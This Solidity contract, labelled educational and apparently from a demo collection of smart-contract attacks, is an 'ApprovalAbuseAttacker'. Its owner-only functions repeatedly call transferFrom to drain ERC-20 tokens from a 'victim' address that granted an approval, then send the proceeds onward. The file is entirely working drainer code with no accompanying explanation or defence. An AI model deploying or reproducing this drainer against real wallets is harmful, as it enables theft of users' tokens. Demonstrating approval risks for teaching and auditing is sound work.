// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../interfaces/IERC20Minimal.sol";

// EDUCATIONAL: Demonstrates approval abuse via infinite approval
contract ApprovalAbuseAttacker {
    address public owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function drainToken(address token, address victim, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transferFrom(victim, address(this), amount);
    }

    function drainRepeatedly(address token, address victim, uint256 times, uint256 amountEachTime)
        external
        onlyOwner
    {
        for (uint256 i = 0; i < times; i++) {
            IERC20Minimal(token).transferFrom(victim, address(this), amountEachTime);
        }
    }

    function transferToken(address token, address to, uint256 amount) external onlyOwner {
        IERC20Minimal(token).transfer(to, amount);
    }

    receive() external payable {}
}
